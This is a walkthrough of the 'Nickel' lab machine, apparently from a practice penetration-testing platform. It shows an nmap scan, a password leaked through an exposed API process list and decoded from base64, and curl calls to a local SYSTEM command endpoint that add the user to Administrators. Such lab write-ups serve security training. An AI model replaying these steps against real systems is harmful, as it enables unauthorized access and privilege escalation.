# Nickel

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.240.99     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-07 14:39 +08
Nmap scan report for 192.168.240.99
Host is up (0.17s latency).
Not shown: 65518 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5040/tcp  open  unknown
7680/tcp  open  pando-pub
8089/tcp  open  unknown
33333/tcp open  dgi-serv
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```

FTP doesn't accept anonymous logins and RDP is open for this machine.&#x20;

### Web Enumeration --> User Creds

Port 80 was weird:

<figure><img src="../../../.gitbook/assets/image (502).png" alt=""><figcaption></figcaption></figure>

Port 8089 was slightly weirder:&#x20;

<figure><img src="../../../.gitbook/assets/image (1057).png" alt=""><figcaption></figcaption></figure>

Clicking on any of these would send requests to an IP address on port 33333:

<figure><img src="../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

Meanwhile on port 33333, we needed a token of some sorts:

<figure><img src="../../../.gitbook/assets/image (1915).png" alt=""><figcaption></figcaption></figure>

And this is all the information we have. I experimented with sending POST requests instead of GET requests, and it actually returned something from port 33333.&#x20;

<figure><img src="../../../.gitbook/assets/image (277).png" alt=""><figcaption></figcaption></figure>

This was different from the Not Found errors. I changed around the directory it sent requests to, and the `list-running-procs` returned something interesting:

<figure><img src="../../../.gitbook/assets/image (2061).png" alt=""><figcaption></figcaption></figure>

If we scroll down, we can see this:

```
name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
              
$ echo 'Tm93aXNlU2xvb3BUaGVvcnkxMzkK' | base64 -d                                
NowiseSloopTheory139
```

This was a password for a user `ariah`, which works:

<figure><img src="../../../.gitbook/assets/image (3357).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### FTP PDF --> Admin Shell

There was a `C:\ftp` directory that looked interesting:

```
 Directory of C:\ftp

09/01/2020  12:38 PM    <DIR>          .
09/01/2020  12:38 PM    <DIR>          ..
09/01/2020  11:02 AM            46,235 Infrastructure.pdf
```

We can transfer this back to our machine via `smbserver.py` and then view it.

<figure><img src="../../../.gitbook/assets/image (2535).png" alt=""><figcaption></figcaption></figure>

There was a temporary command point, and I enumerated it from the machine:

```
ariah@NICKEL C:\ftp>curl http://nickel/?whoami
<!doctype html><html><body>dev-api started at 2023-02-17T09:16:22

        <pre>nt authority\system
</pre>
</body></html>
```

It seems that we have a SYSTEM shell with this command endpoint. What we can do is just add `ariah` to the Administrators group.&#x20;

```
ariah@NICKEL C:\ftp>curl http://nickel/?net%20localgroup%20administrators%20ariah%20/add     
<!doctype html><html><body>dev-api started at 2023-02-17T09:16:22

        <pre>The command completed successfully.

</pre>
</body></html>

ariah@NICKEL C:\ftp>net user ariah
User name                    ariah
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/1/2020 12:38:26 PM
Password expires             Never
Password changeable          9/1/2020 12:38:26 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/6/2023 11:56:18 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
The command completed successfully.
```

Then, we can relogin and view the flag:

<figure><img src="../../../.gitbook/assets/image (2605).png" alt=""><figcaption></figcaption></figure>

Rooted!
